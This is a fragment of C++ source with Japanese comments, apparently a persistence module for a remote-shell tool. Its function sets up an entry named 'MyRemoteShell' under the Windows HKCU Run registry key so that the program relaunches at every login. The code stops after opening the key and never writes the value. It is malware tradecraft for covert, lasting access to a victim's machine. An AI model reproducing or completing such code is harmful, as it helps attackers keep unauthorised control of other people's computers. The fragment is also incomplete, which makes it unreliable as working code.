// 持続性メカニズムのコマンド
#include "Persistence.h"

// Runレジストリキーで持続性メカニズム
void RunRegistry(std::vector<std::string>& tokens) {
    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"MyRemoteShell";

    // 実行可能ファイルのパスを取得
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // レジストリキーを開く
    RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    
}